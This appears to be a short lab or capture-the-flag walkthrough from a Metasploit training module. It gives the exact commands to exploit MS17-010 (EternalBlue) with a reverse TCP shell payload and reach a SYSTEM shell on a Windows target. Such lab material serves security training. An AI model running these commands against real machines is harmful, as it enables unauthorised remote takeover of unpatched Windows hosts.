# Module 39 — Using The Metasploit Framework
## Section 4: Modules

**Target:** Windows box vulnerable to MS17-010 (EternalBlue/EternalRomance).

## Approach
```
use exploit/windows/smb/ms17_010_psexec
set PAYLOAD windows/shell_reverse_tcp
set RHOSTS <target>
set LHOST <your-tun0-ip>
exploit
```
This gets you a SYSTEM shell via the SMB vulnerability. Read the flag from wherever the shell lands you.
